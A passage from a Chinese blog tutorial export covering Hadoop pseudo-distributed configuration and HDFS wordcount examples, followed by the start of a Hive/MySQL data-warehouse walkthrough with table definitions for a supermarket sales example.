<li><p>现在我们可以执行例子来感受下 Hadoop 的运行。Hadoop 附带了丰富的例子（运行 <code>./bin/hadoop jar ./share/hadoop/mapreduce/hadoop-mapreduce-examples-3.0.3.jar</code> 可以看到所有例子），包括 wordcount、terasort、join、grep 等。</p>
</li>
<li><p>在此我们选择运行 wordcount例子，我们将 input 文件夹中的所有文件作为输入，最后输出结果到 output 文件夹中。</p>
</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> /usr/local/hadoop</span><br><span class="line">mkdri iniput1</span><br><span class="line"><span class="built_in">cp</span> ./etc/hadoop/*.xml ./input1</span><br><span class="line"><span class="comment"># 在HDFS创建一个目录</span></span><br><span class="line">hdfs dfs -<span class="built_in">mkdir</span> /usr/local/hadoop/input</span><br><span class="line"><span class="comment">#  将配置文件作为输入文件上传到刚创建的HDFS目录中</span></span><br><span class="line">hdfs dfs -put ./input1/* /usr/local/hadoop/input</span><br><span class="line"></span><br><span class="line">hadoop jar ./share/hadoop/mapreduce/hadoop-mapreduce-examples-*.jar wordcount /usr/local/hadoop/input /usr/local/hadoop/output </span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看运行结果列表</span></span><br><span class="line">[hadoop@VM-24-13-centos hadoop]$ hdfs dfs -<span class="built_in">ls</span> /usr/local/hadoop/output/*</span><br><span class="line"></span><br><span class="line">-rw-r--r--   1 hadoop supergroup          0 2021-12-10 16:48 /usr/local/hadoop/output/_SUCCESS</span><br><span class="line">-rw-r--r--   1 hadoop supergroup       9405 2021-12-10 16:48 /usr/local/hadoop/output/part-r-00000</span><br><span class="line"></span><br><span class="line"><span class="comment"># 用cat查运行数据</span></span><br><span class="line">[hadoop@VM-24-13-centos hadoop]$ hdfs dfs -<span class="built_in">cat</span> /usr/local/hadoop/output/part-r-00000</span><br><span class="line">...</span><br><span class="line">datanodes       1</span><br><span class="line">decryptEncryptedKey     1</span><br><span class="line">default 13</span><br><span class="line">default_priority=&#123;priority&#125;]    1</span><br><span class="line">defined.        4</span><br><span class="line">delete-key      1</span><br><span class="line">dfsadmin        1</span><br><span class="line">different   </span><br></pre></td></tr></table></figure>

<ul>
<li><p><strong>注意</strong>，Hadoop 默认不会覆盖结果文件，因此再次运行上面实例会提示出错，需要先将 <code>./output</code> 删除。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[hadoop@VM-24-13-centos hadoop]$ hdfs dfs -<span class="built_in">rm</span> -r /usr/local/hadoop/output</span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="Hadoop伪分布式配置"><a href="#Hadoop伪分布式配置" class="headerlink" title="Hadoop伪分布式配置"></a>Hadoop伪分布式配置</h2><ul>
<li>Hadoop 可以在单节点上以伪分布式的方式运行，Hadoop 进程以分离的 Java 进程来运行，<strong>节点既作为 NameNode 也作为 DataNode，同时读取的是 HDFS 中的文件</strong>。</li>
</ul>
<h3 id="设置环境变量"><a href="#设置环境变量" class="headerlink" title="设置环境变量"></a>设置环境变量</h3><ul>
<li>在设置 Hadoop 伪分布式配置前，我们还需要设置 HADOOP 环境变量，执行如下命令在 ~&#x2F;.bashrc 中设置：</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vi ~/.bashrc</span><br><span class="line"></span><br><span class="line"># Hadoop Environment Variables</span><br><span class="line">export HADOOP_HOME=/usr/local/hadoop # hadoop的安装路径</span><br><span class="line">export HADOOP_INSTALL=$HADOOP_HOME</span><br><span class="line">export HADOOP_MAPRED_HOME=$HADOOP_HOME # 设置MAPRED环境变量</span><br><span class="line">export HADOOP_COMMON_HOME=$HADOOP_HOME # 设置COMMON环境变量</span><br><span class="line">export HADOOP_HDFS_HOME=$HADOOP_HOME # HDFS的环境变量</span><br><span class="line">export YARN_HOME=$HADOOP_HOME # YARN的环境变量</span><br><span class="line">export JAVA_HOME=/usr/local/jdk1.8.0_311 # 设置jdk的安装目录（用which java查看到）</span><br><span class="line">export HADOOP_COMMON_LIB_NATIVE_DIR=$HADOOP_HOME/lib/native</span><br><span class="line">export PATH=$PATH:$HADOOP_HOME/sbin:$HADOOP_HOME/bin</span><br></pre></td></tr></table></figure>

<ul>
<li><p>生效环境变量</p>
<p> <code>source ~/.bashrc</code></p>
</li>
<li><p>修改Hadoop-env.sh中的java_home，不然在启动集群（伪集群）时出现报错</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo vi /usr/local/hadoop/etc/hadoop/hadoop-env.sh</span><br><span class="line"></span><br><span class="line"># 设置如下</span><br><span class="line">export JAVA_HOME=/usr/local/jdk1.8.0_311</span><br><span class="line"></span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="配置文件"><a href="#配置文件" class="headerlink" title="配置文件"></a>配置文件</h3><ul>
<li><p>Hadoop 的配置文件位于 <code>/usr/local/hadoop/etc/hadoop/</code> 中，伪分布式需要修改2个配置文件 <strong>core-site.xml</strong> 和 <strong>hdfs-site.xml</strong></p>
</li>
<li><p>Hadoop的配置文件是 xml 格式，每个配置以声明 property 的 name 和 value 的方式来实现。</p>
</li>
<li><p>修改配置文件 <strong>core-site.xml</strong> </p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">sudo vi /usr/local/hadoop/etc/hadoop/core-site.xml </span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">name</span>&gt;</span>hadoop.tmp.dir<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">value</span>&gt;</span>file:/usr/local/hadoop/tmp<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">description</span>&gt;</span>Abase for other temporary directories.<span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"></span><br><span class="line"># 设置HDFS的默认名称，在使用命令调用时，可以用此名称</span><br><span class="line"> <span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">name</span>&gt;</span>fs.defaultFS<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">value</span>&gt;</span>hdfs://localhost:9000<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br></pre></td></tr></table></figure>


</li>
<li><p>同样的，修改配置文件 <strong>hdfs-site.xml</strong>：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">name</span>&gt;</span>dfs.replication<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">value</span>&gt;</span>1<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">description</span>&gt;</span>设置blocks副本数<span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">name</span>&gt;</span>dfs.namenode.name.dir<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">value</span>&gt;</span>file:/usr/local/hadoop/tmp/dfs/name<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">description</span>&gt;</span>设置存放NameNode的数据存储目录<span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">name</span>&gt;</span>dfs.datanode.data.dir<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">value</span>&gt;</span>file:/usr/local/hadoop/tmp/dfs/data<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">description</span>&gt;</span>设置存放DataNode的数据存储目录<span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>配置完成后，执行 NameNode 的格式化:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">./bin/hdfs namenode -format</span><br></pre></td></tr></table></figure>
</li>
<li><p>接着开启 <code>NaneNode</code> 和 <code>DataNode</code> 守护进程，<code>./sbin/start-dfs.sh</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[hadoop@VM-24-13-centos hadoop]$ ./sbin/start-dfs.sh</span><br><span class="line">Starting namenodes on [localhost]</span><br><span class="line">Starting datanodes</span><br><span class="line">Starting secondary namenodes [VM-24-13-centos]</span><br><span class="line"></span><br></pre></td></tr></table></figure>
</li>
<li><p>启动完成后，可以通过命令 <code>jps</code> 来判断是否成功启动，若成功启动则会列出如下进程: <code>NameNode</code>、<code>DataNode</code>和<code>SecondaryNameNode</code>（如果 SecondaryNameNode 没有启动，请运行 sbin&#x2F;stop-dfs.sh 关闭进程，然后再次尝试启动尝试）。如果没有 NameNode 或 DataNode ，那就是配置不成功，请仔细检查之前步骤，或通过查看启动日志排查原因。</p>
</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">[hadoop@VM-24-13-centos hadoop]$ jps</span><br><span class="line">12433 Jps</span><br><span class="line">11741 DataNode</span><br><span class="line">11597 NameNode</span><br><span class="line">11934 SecondaryNameNode</span><br><span class="line"><span class="comment"># HDFS功能：NameNode，SecondaryNameNode，DataNode已经启动</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p><strong>通过查看启动日志分析启动失败原因</strong></p>
<p>有时 Hadoop 无法正确启动，如 NameNode 进程没有顺利启动，这时可以查看启动日志来排查原因，注意几点：</p>
<ul>
<li>启动时会提示形如 “dblab: starting namenode, logging to &#x2F;usr&#x2F;local&#x2F;hadoop&#x2F;logs&#x2F;hadoop-hadoop-namenode-dblab.out”，其中 dblab 对应你的主机名，但启动的日志信息是记录在 &#x2F;usr&#x2F;local&#x2F;hadoop&#x2F;logs&#x2F;hadoop-hadoop-namenode-dblab.log 中，所以应该查看这个后缀为 <strong>.log</strong> 的文件；</li>
<li>每一次的启动日志都是追加在日志文件之后，所以得拉到最后面看，看下记录的时间就知道了。</li>
<li>一般出错的提示在最后面，也就是写着 Fatal、Error 或者 Java Exception 的地方。</li>
<li>可以在网上搜索一下出错信息，看能否找到一些相关的解决方法。</li>
</ul>
</blockquote>
<h3 id="实例-1"><a href="#实例-1" class="headerlink" title="实例"></a>实例</h3><ul>
<li><p>上面的单机模式，grep 例子读取的是本地数据，伪分布式读取的则是 HDFS 上的数据。要使用 HDFS，首先需要在 HDFS 中创建用户目录：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[hadoop@VM-24-13-centos hadoop]$ ./bin/hdfs dfs -<span class="built_in">mkdir</span> -p /user/hadoop</span><br><span class="line">2021-12-07 16:25:32,492 WARN util.NativeCodeLoader: Unable to load native-hadoop library <span class="keyword">for</span> your platform... using builtin-java classes <span class="built_in">where</span> applicable</span><br></pre></td></tr></table></figure>
</li>
<li><p>接着将·<code>./etc/hadoop</code>中的 xml 文件作为输入文件复制到分布式文件系统中，即将<code> /usr/local/hadoop/etc/hadoop</code> 复制到分布式文件系统中的<code>/user/hadoop/input</code>中。我们使用的是 hadoop 用户，并且已创建相应的用户目录<code> /user/hadoop</code> ，因此在命令中就可以使用相对路径如 input，其对应的绝对路径就是<code> /user/hadoop/input</code></p>
</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">./bin/hdfs dfs -<span class="built_in">mkdir</span> input</span><br><span class="line">./bin/hdfs dfs -put ./etc/hadoop/*.xml input</span><br></pre></td></tr></table></figure>

<ul>
<li><p>复制完成后，可以通过如下命令查看 HDFS 中的文件列表：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[hadoop@VM-24-13-centos hadoop]$ ./bin/hdfs dfs -<span class="built_in">ls</span> input</span><br><span class="line"></span><br><span class="line">Found 9 items</span><br><span class="line">-rw-r--r--   1 hadoop supergroup       7861 2021-12-07 16:28 input/capacity-scheduler.xml</span><br><span class="line">-rw-r--r--   1 hadoop supergroup       1071 2021-12-07 16:28 input/core-site.xml</span><br><span class="line">-rw-r--r--   1 hadoop supergroup      10206 2021-12-07 16:28 input/hadoop-policy.xml</span><br><span class="line">-rw-r--r--   1 hadoop supergroup       1339 2021-12-07 16:28 input/hdfs-site.xml</span><br><span class="line">-rw-r--r--   1 hadoop supergroup        620 2021-12-07 16:28 input/httpfs-site.xml</span><br><span class="line">-rw-r--r--   1 hadoop supergroup       3518 2021-12-07 16:28 input/kms-acls.xml</span><br><span class="line">-rw-r--r--   1 hadoop supergroup        682 2021-12-07 16:28 input/kms-site.xml</span><br><span class="line">-rw-r--r--   1 hadoop supergroup        758 2021-12-07 16:28 input/mapred-site.xml</span><br><span class="line">-rw-r--r--   1 hadoop supergroup        690 2021-12-07 16:28 input/yarn-site.xml</span><br></pre></td></tr></table></figure>
</li>
<li><p>伪分布式运行 MapReduce 作业的方式跟单机模式相同，区别在于伪分布式读取的是HDFS中的文件（可以将单机步骤中创建的本地 input 文件夹，输出结果 output 文件夹都删掉来验证这一点）。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[hadoop@VM-24-13-centos hadoop]$ ./bin/hadoop jar ./share/hadoop/mapreduce/hadoop-mapreduce-examples-*.jar  wordcount input output </span><br><span class="line">....</span><br><span class="line">2021-12-07 16:30:56,021 INFO mapreduce.Job: Job job_local897809468_0002 completed successfully</span><br><span class="line">...</span><br><span class="line"></span><br></pre></td></tr></table></figure>
</li>
<li><p>查看运行结果的命令（查看的是位于 HDFS 中的输出结果）：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[hadoop@VM-24-13-centos hadoop]$ ./bin/hdfs dfs -<span class="built_in">ls</span> output/*</span><br><span class="line"></span><br><span class="line">-rw-r--r--   1 hadoop supergroup          0 2021-12-10 17:58 output/_SUCCESS</span><br><span class="line">-rw-r--r--   1 hadoop supergroup       9405 2021-12-10 17:58 output/part-r-00000</span><br><span class="line"></span><br><span class="line">[hadoop@VM-24-13-centos hadoop]$ ./bin/hdfs dfs -<span class="built_in">cat</span> output/part-r-00000</span><br><span class="line">....</span><br><span class="line"></span><br></pre></td></tr></table></figure>


</li>
<li><p>我们也可以将运行结果取回到本地：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">rm</span> -r ./output    <span class="comment"># 先删除本地的 output 文件夹（如果存在）</span></span><br><span class="line">./bin/hdfs dfs -get output ./output     <span class="comment"># 将 HDFS 上的 output 文件夹拷贝到本机</span></span><br><span class="line">[hadoop@VM-24-13-centos hadoop]$ <span class="built_in">cat</span> ./output/*</span><br><span class="line">.....</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
</li>
<li><p>Hadoop 运行程序时，输出目录不能存在，否则会提示错误 <code>org.apache.hadoop.mapred.FileAlreadyExistsException: Output directory hdfs://localhost:9000/user/hadoop/output already exists</code>，因此若要再次执行，需要执行如下命令删除 output 文件夹:</p>
</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./bin/hdfs dfs -rm -r output    # 删除 output 文件夹</span><br></pre></td></tr></table></figure>

<ul>
<li>为防止覆盖结果，程序指定的输出目录（如 output）不能存在，否则会提示错误，运行前需要先删除输出目录。在实际开发应用程序时，可考虑在程序中加上如下代码，能在每次运行时自动删除输出目录，避免繁琐的命令行操作，可以采用类似于下面java代码：</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Configuration</span> <span class="variable">conf</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Configuration</span>();</span><br><span class="line"><span class="type">Job</span> <span class="variable">job</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Job</span>(conf);</span><br><span class="line"> </span><br><span class="line"><span class="comment">/* 删除输出目录 */</span></span><br><span class="line"><span class="type">Path</span> <span class="variable">outputPath</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Path</span>(args[<span class="number">1</span>]);</span><br><span class="line">outputPath.getFileSystem(conf).delete(outputPath, <span class="literal">true</span>);</span><br></pre></td></tr></table></figure>

<ul>
<li><p>若要关闭 Hadoop，则运行</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">./sbin/stop-dfs.sh</span><br></pre></td></tr></table></figure>
</li>
<li><p>下次启动 hadoop 时，无需进行 NameNode 的初始化，只需要运行 <code>./sbin/start-dfs.sh</code> 就可以！</p>
</li>
</ul>
<h2 id="完全分布式"><a href="#完全分布式" class="headerlink" title="完全分布式"></a>完全分布式</h2><p>后续打算采用本地三台虚拟机的模式搭建完全分布式。</p>
<p>请注意分布式运行中的这几个结点的区别：</p>
<ul>
<li>从分布式存储的角度来说，集群中的结点由一个NameNode和若干个DataNode组成,另有一个SecondaryNameNode作为NameNode的备份。</li>
<li>从分布式应用的角度来说，集群中的结点由一个JobTracker和若干个TaskTracker组成，JobTracker负责任务的调度，TaskTracker负责并行执行任务。TaskTracker必须运行在DataNode上，这样便于数据的本地计算。JobTracker和NameNode则无须在同一台机器上。一个机器上，既当namenode，又当datanode,或者说 既 是jobtracker,又是tasktracker。没有所谓的在多台机器上进行真正的分布式计算，故称为”伪分布式”。</li>
<li>真正的分布式，由3个及以上的实体机或者虚拟机组件的机群。</li>
<li>来自<a href="https://www.cnblogs.com/liango/p/7116620.html">这里</a></li>
</ul>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul>
<li><p><a href="http://dblab.xmu.edu.cn/blog/install-hadoop-in-centos/">Hadoop安装教程_伪分布式配置_CentOS6.4&#x2F;Hadoop2.6.0</a></p>
</li>
<li><p><a href="https://www.jianshu.com/p/43cfffe7090d">ubuntn-Hadoop 单台Cluster的安装</a></p>
</li>
</ul>
]]></content>
      <categories>
        <category>大数据</category>
      </categories>
      <tags>
        <tag>大数据</tag>
        <tag>Hadoop</tag>
      </tags>
  </entry>
  <entry>
    <title>第五章 数据仓库实例</title>
    <url>/aposts/bcb72660/</url>
    <content><![CDATA[<h2 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h2><p>阅读本章，请把hadoop和hive环境搭建好，可以参考如下文章：</p>
<ul>
<li><a href="http://www.shikun.work/aposts/d7dcf086/">第三章 大数据之Hadoop搭建</a></li>
<li><a href="http://www.shikun.work/aposts/ae85ee2e/">第四章 大数据之hive搭建</a></li>
<li>本次实例来自对《大数据测试技术与实践》中实例补充，书中的实例并不能直接使用,有些地方是错误的，我也修改和补充</li>
</ul>
<h2 id="数据仓库实例"><a href="#数据仓库实例" class="headerlink" title="数据仓库实例"></a>数据仓库实例</h2><ul>
<li><p>在本节中,我们通过一个简单的实例介绍数据仓库对数据的处理过程。假设有一家连锁超市,它有多家分店。每一个分店都有很多种类的商品,包括日用品、肉类、冷冻食品、烘焙食品和花卉等。所有产<br>品在整个连锁超市环境下有一个唯一的产品编号。图3-15为一张顾客结账清单。</p>
<p><img src="/aposts/bcb72660/image-20211214170515688.png" alt="image-20211214170515688"></p>
</li>
<li><p>经过一段时间的商品销售后,连锁超市积累了大量销售数据，如下图所示,超市分店具有分店名、分店地址<br>和开店时间属性,商品有商品类别、商品价格、唯一编号和生产地址属性。当然,地址可以进一步拆分为省、市等。</p>
</li>
</ul>
<p><img src="/aposts/bcb72660/image-20211214170552603.png" alt="image-20211214170552603"></p>
<ul>
<li>假设对商品A进行促销,如发放代金券、降价等,现在分析促销活动对商品A销售量的，为了简便,<strong>本实例统计超市分店中商品A每天的销售量、到店消费人数和购买商品A的消费者的比例</strong></li>
<li>我们在<a href="https://moon-full.gitee.io/2021/12/06/%E6%95%B0%E6%8D%AE%E4%BB%93%E7%9A%84%E8%AE%BE%E8%AE%A1%E4%B8%8E%E6%9E%84%E5%BB%BA/">数据仓的设计与构建</a>文章中的数据仓库的设计中提到过,数据仓库分为数据接入层、数据明细层、数据汇总层和数据集市等。数据接入层负责将业务系统中的商品相关销售数据导入;数据明细层负责对数据接入层的数据进行预处理,过滤”脏”数据等;数据汇总层将数据按照订单进行汇总;数据集市层负责聚合计算相应的指标。</li>
<li>由于要对商品在时间、地点等维度的指标进行汇总计算,因此,我们在数据仓库层使用维度建模方式建表，（我们在<a href="https://moon-full.gitee.io/2021/12/06/%E7%AC%AC%E4%BA%8C%E7%AB%A0%20%E6%95%B0%E6%8D%AE%E4%BB%93%E7%9A%84%E8%AE%BE%E8%AE%A1%E4%B8%8E%E6%9E%84%E5%BB%BA/">数据仓的设计与构建</a>中的数据仓库建模方法也说过相应概念）。显然,我们对日期、超市分店(地址)和商品等维度比较感兴趣。图3-17所示为商品的维度模型实际的建模过程比这复杂。以日期维度为例,在实际建模中,时间维度表一般会会有当天是一个月中的哪一天,当天是一年中的哪天,当前周是一年中的哪周,当前季度是年中哪季度,以及时间视计算肭表示等字段,方便将销售指标在各种时间点上进行同比。</li>
</ul>
<p><img src="/aposts/bcb72660/image-20211214172404147.png" alt="image-20211214172404147"></p>
<ul>
<li><p>假设超市业务系统中的销售数据是以实际购物清单拆分的形式存放,即在购物清单中,含有品、商品价格和交易时间(清单创建时间)等信息,则超市业务系统的数据库中会有如图下的表关系</p>
<p><img src="/aposts/bcb72660/image-20211214172637088.png" alt="image-20211214172637088"></p>
</li>
<li><p>由于商品信息表和超市分店信息表的数据量不大,且基本无改动,因此可以选择<strong>全量更新</strong>的方式将数据加载到数据仓库。而来自各超市分店的商品销售清单的数据量很大,且每天会有新插入的数据记录,因此,在将数据加载到数据仓库时,可以选择<strong>增量加载</strong>方式</p>
</li>
<li><p>在本实例中,对于数据仓库的存储,采用HDFS和Hive,在ETL过程中,使用 HiveQL。图3-19为各级数据表的关系。</p>
</li>
</ul>
<p><img src="/aposts/bcb72660/image-20211215100757274.png" alt="image-20211215100757274"></p>
<h2 id="数据接入层ODS"><a href="#数据接入层ODS" class="headerlink" title="数据接入层ODS"></a>数据接入层ODS</h2><h3 id="创建接入层的表"><a href="#创建接入层的表" class="headerlink" title="创建接入层的表"></a>创建接入层的表</h3><p>首先，在Hive中，创建数据库接入层对应的表，代码如下：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"># 切换到hadoop用户</span><br><span class="line">su hadoop</span><br><span class="line"># 进入到hive</span><br><span class="line">hive</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 创建超市分店信息表</span></span><br><span class="line"><span class="keyword">DROP</span> <span class="keyword">TABLE</span> IF <span class="keyword">EXISTS</span> ods_market_info;</span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> ods_market_info(</span><br><span class="line">market_id string comment <span class="string">&#x27;超市分店编号&#x27;</span>,</span><br><span class="line">market_address string comment <span class="string">&#x27;超市分店地址&#x27;</span>,</span><br><span class="line">start_time string comment <span class="string">&#x27;有效期起始时间&#x27;</span>,</span><br><span class="line">end_time string comment <span class="string">&#x27;有效期终止时间&#x27;</span>,</span><br><span class="line">market_name string comment <span class="string">&#x27;超市分店名称&#x27;</span>,</span><br><span class="line">create_time string comment <span class="string">&#x27;创建时间&#x27;</span>,</span><br><span class="line">update_time string comment <span class="string">&#x27;更新时间&#x27;</span></span><br><span class="line">)</span><br><span class="line">partitioned <span class="keyword">by</span>(dt string)</span><br><span class="line"><span class="type">row</span> format delimited fields terminated <span class="keyword">by</span> <span class="string">&#x27;\t&#x27;</span>;</span><br><span class="line"></span><br><span class="line">	</span><br><span class="line"><span class="comment">--创建商品信息表</span></span><br><span class="line"><span class="keyword">DROP</span> <span class="keyword">TABLE</span> IF <span class="keyword">EXISTS</span> ods_product_info;</span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> ods_product_info(</span><br><span class="line">product_id <span class="type">int</span> comment <span class="string">&#x27;商品id&#x27;</span>,</span><br><span class="line">type_name string comment <span class="string">&#x27;类别名&#x27;</span>,</span><br><span class="line">supplier_phone string comment <span class="string">&#x27;供应商手机号&#x27;</span>,</span><br><span class="line">supplier_address string comment <span class="string">&#x27;供应商地址&#x27;</span>,</span><br><span class="line">product_price string comment <span class="string">&#x27;商品价格&#x27;</span>,</span><br><span class="line">product_desc string comment <span class="string">&#x27;商品说明&#x27;</span>,</span><br><span class="line">start_time string comment <span class="string">&#x27;有效期起始时间&#x27;</span>,</span><br><span class="line">end_time string comment <span class="string">&#x27;有效期终止时间&#x27;</span>,</span><br><span class="line">product_name string comment <span class="string">&#x27;商品名称&#x27;</span>,</span><br><span class="line">create_time string comment <span class="string">&#x27;创建时间&#x27;</span>,</span><br><span class="line">update_time string comment <span class="string">&#x27;更新时间&#x27;</span></span><br><span class="line">) comment <span class="string">&#x27;商品信息表&#x27;</span></span><br><span class="line">partitioned <span class="keyword">by</span>(dt string)</span><br><span class="line"><span class="type">row</span> format delimited fields terminated <span class="keyword">by</span> <span class="string">&#x27;\t&#x27;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">--创建清单记录表</span></span><br><span class="line"><span class="keyword">DROP</span> <span class="keyword">TABLE</span> IF <span class="keyword">EXISTS</span> ods_sale_info;</span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> ods_sale_info( </span><br><span class="line">order_id string comment <span class="string">&#x27;清单号&#x27;</span>,</span><br><span class="line">order_status string comment <span class="string">&#x27;清单状态&#x27;</span>, </span><br><span class="line">market_id string comment<span class="string">&#x27; 超市分店编号&#x27;</span>,</span><br><span class="line">product_num <span class="type">int</span> comment <span class="string">&#x27;商品数量&#x27;</span>,</span><br><span class="line">product_id <span class="type">int</span> comment <span class="string">&#x27;商品id&#x27;</span>,</span><br><span class="line">create_time string comment <span class="string">&#x27;创建时间&#x27;</span>,</span><br><span class="line">update_time string comment <span class="string">&#x27;更新时间&#x27;</span></span><br><span class="line">) comment <span class="string">&#x27;清单记录表&#x27;</span></span><br><span class="line">PARTITIONED <span class="keyword">BY</span> (dt string)</span><br><span class="line"><span class="type">ROW</span> FORMAT DELIMITED FIELDS TERMINATED <span class="keyword">BY</span> <span class="string">&#x27;\t&#x27;</span>;</span><br><span class="line"></span><br><span class="line"># 查看到新建成功的表</span><br><span class="line">hive<span class="operator">&gt;</span> <span class="keyword">show</span> tables;</span><br><span class="line">OK</span><br><span class="line">course</span><br><span class="line">ods_market_info</span><br><span class="line">ods_product_info</span><br><span class="line">ods_sale_info</span><br><span class="line">stu</span><br><span class="line">stu1</span><br><span class="line"><span class="type">Time</span> taken: <span class="number">0.026</span> seconds, Fetched: <span class="number">6</span> <span class="type">row</span>(s)</span><br></pre></td></tr></table></figure>

<h3 id="准备业务数据"><a href="#准备业务数据" class="headerlink" title="准备业务数据"></a>准备业务数据</h3><ul>
<li><p>批量造mysql表的数据，采用存储过程的方式</p>
</li>
<li><p>mysql中创建业务关系表，product_info（商品信息表）、market_info（超市分店信息表）、sale_info（清单记录表）</p>
</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql <span class="operator">-</span>uroot <span class="operator">-</span>p </span><br><span class="line">use hive</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 创建商品信息表，以id为主键</span></span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> product_info(</span><br><span class="line">id <span class="type">int</span>(<span class="number">10</span>) <span class="keyword">not</span> <span class="keyword">null</span> auto_increment <span class="keyword">primary</span> key,</span><br><span class="line">product_id <span class="type">int</span> comment <span class="string">&#x27;商品id&#x27;</span>,</span><br><span class="line">type_name <span class="type">varchar</span>(<span class="number">100</span>) comment <span class="string">&#x27;类别名&#x27;</span>,</span><br><span class="line">supplier_phone <span class="type">varchar</span>(<span class="number">100</span>) comment <span class="string">&#x27;供应商手机号&#x27;</span>,</span><br><span class="line">supplier_address <span class="type">varchar</span>(<span class="number">100</span>) comment <span class="string">&#x27;供应商地址&#x27;</span>,</span><br><span class="line">product_price <span class="type">varchar</span>(<span class="number">100</span>) comment <span class="string">&#x27;商品价格&#x27;</span>,</span><br><span class="line">product_desc <span class="type">varchar</span>(<span class="number">100</span>) comment <span class="string">&#x27;商品说明&#x27;</span>,</span><br><span class="line">start_time <span class="type">varchar</span>(<span class="number">100</span>) comment <span class="string">&#x27;有效期起始时间&#x27;</span>,</span><br><span class="line">end_time <span class="type">varchar</span>(<span class="number">100</span>) comment <span class="string">&#x27;有效期终止时间&#x27;</span>,</span><br><span class="line">product_name <span class="type">varchar</span>(<span class="number">100</span>) comment <span class="string">&#x27;商品名称&#x27;</span>,</span><br><span class="line">create_time <span class="type">varchar</span>(<span class="number">100</span>) comment <span class="string">&#x27;创建时间&#x27;</span>,</span><br><span class="line">update_time <span class="type">varchar</span>(<span class="number">100</span>) comment <span class="string">&#x27;更新时间&#x27;</span></span><br><span class="line">) engine<span 